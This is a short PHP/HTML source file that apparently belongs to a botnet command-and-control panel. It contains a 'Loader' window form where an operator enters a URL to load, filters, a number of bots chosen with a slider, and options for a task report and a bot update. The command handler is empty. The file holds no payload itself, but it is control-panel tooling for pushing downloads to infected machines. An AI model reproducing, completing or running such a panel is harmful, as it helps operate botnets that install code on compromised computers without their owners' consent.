<?php
	if(isset($_GET['command'])) {
		switch(strtolower($_GET['command']))
		{
			case "":
				// Lolwut		
				break;
			default:						
		}
	} else {
?>
	<form action="index.php?p=UIWindowLoader" method="get" onsubmit="return processLoader(this)">
		Load URL <input id="Loader_LoadURL" name="LoadURL" type="text" style="position:absolute;right:4px" /><br /><br />
		Filters <input id="Loader_Filters" name="Filters" type="text" style="position:absolute;right:4px" /><br /><br />
		<a href="javascript:void(0)" onclick="showWindow('filters')" style="position:absolute;right:4px;text-align:right">Specify</a>
		<br /><br />
		Bots <input id="Loader_Bots" size="6" name="Bots" type="text" value="0" style="position:absolute;right:4px;height:17px;text-align:right;" />
		<div onclick="onMouse_Slider(event)" onmousemove="onMouse_SliderMove(event)" onmouseleave="onMouse_SliderEnd(event)" onmouseup="onMouse_SliderEnd(event)" onmousedown="onMouse_SliderBegin(event)" id="Loader_Control_Slider" class="precipitationBGGray" style="float:right;position:relative;right:60px;/*top:-14px;left:75px;*/width:100px;"><div onclick="onMouse_InnerSlider(event)" id="Loader_Control_InnerSlider" class="curPrecipitation" style="width:1%;"></div></div>
		<br /><br />
		Create Task Report <input id="Loader_StatusPage" name="StatusPage" type="checkbox" checked="checked" style="position:absolute;right:4px;height:17px;text-align:right;" />
		<br /><br />
		Update <input id="Loader_Update" name="Update" type="checkbox" style="position:absolute;right:4px;height:17px;text-align:right;" />
		<br /><br />
		<input id="cancelLoader" name="cancel" value="Cancel" type="button" style="position:absolute;right:25%;" onclick="hideWindow('loader')" /> <input id="submitLoader" name="submit" value="Load" type="submit" style="position:absolute;left:25%;" />
	</form>

<?php
	}
?>